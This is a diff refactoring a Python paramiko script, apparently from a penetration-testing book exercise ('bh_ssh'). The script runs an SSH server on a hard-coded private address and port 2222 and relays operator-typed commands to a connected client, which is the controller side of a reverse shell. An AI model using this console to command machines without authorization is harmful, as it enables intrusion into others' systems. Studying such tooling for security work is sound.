@@ -4,8 +4,6 @@ import socket
 import sys
 import threading
 
-CWD = os.path.dirname(os.path.realpath(__file__))
-HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))
 
 class Server (paramiko.ServerInterface):
     def __init__(self):
@@ -21,7 +19,10 @@ class Server (paramiko.ServerInterface):
             return paramiko.AUTH_SUCCESSFUL
         return paramiko.AUTH_FAILED
 
-if __name__ == '__main__':
+def main():
+    cwd = os.path.dirname(os.path.realpath(__file__))
+    host_key = paramiko.RSAKey(filename=os.path.join(cwd, 'test_rsa.key'))
+
     server = '192.168.1.207'
     ssh_port = 2222
     try:
@@ -38,7 +39,7 @@ if __name__ == '__main__':
         print('[+] Got a connection!', client, addr)
 
     bhSession = paramiko.Transport(client)
-    bhSession.add_server_key(HOSTKEY)
+    bhSession.add_server_key(host_key)
     server = Server()
     bhSession.start_server(server=server)
 
@@ -52,7 +53,7 @@ if __name__ == '__main__':
     chan.send('Welcome to bh_ssh')
     try:
         while True:
-            command=input('Enter command: ')
+            command = input('Enter command: ')
             if command != 'exit':
                 chan.send(command)
                 r = chan.recv(8192)
@@ -64,3 +65,7 @@ if __name__ == '__main__':
                 break
     except KeyboardInterrupt:
         bhSession.close()
+
+
+if __name__ == '__main__':
+    main()
